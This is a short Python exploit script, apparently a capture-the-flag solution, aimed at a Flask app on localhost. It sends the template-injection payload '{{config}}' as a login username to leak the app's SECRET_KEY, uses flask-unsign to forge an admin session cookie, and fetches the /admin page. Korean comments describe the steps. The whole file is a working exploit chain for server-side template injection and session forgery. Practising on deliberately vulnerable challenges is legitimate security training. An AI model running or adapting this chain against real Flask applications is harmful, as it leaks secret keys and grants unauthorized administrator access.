import requests
import html
import subprocess

def exploit_admin_page(url, payload):
    try:
        res = requests.post(url=url+'/login', data=payload)
        decoded_text = html.unescape(res.text)
        start_index = decoded_text.find("'SECRET_KEY': '") + len("'SECRET_KEY': '")
        end_index = decoded_text.find("'", start_index)
        secret_key = decoded_text[start_index:end_index]
        print("SECRET_KEY:", secret_key)
        exploit = subprocess.run(['flask-unsign', '--sign', '--cookie', '{\'admin\':True}', '--secret', secret_key], capture_output=True)
        cookie_value = exploit.stdout.strip().decode('utf-8')
        res = requests.get(url=url + "/admin", cookies={"session": cookie_value})
        if "hspace" in res.text:
            print(res.text)
        else:
            exploit_admin_page(url, payload)
    except Exception as e:
        print("Error occurred:", e)

# Flask 서버 URL
url = 'http://localhost:2000'

# 유효한 사용자 정보로 POST 요청을 보냅니다.
payload = {"username": "{{config}}", "password": "aa"}

# 함수 호출
exploit_admin_page(url, payload)
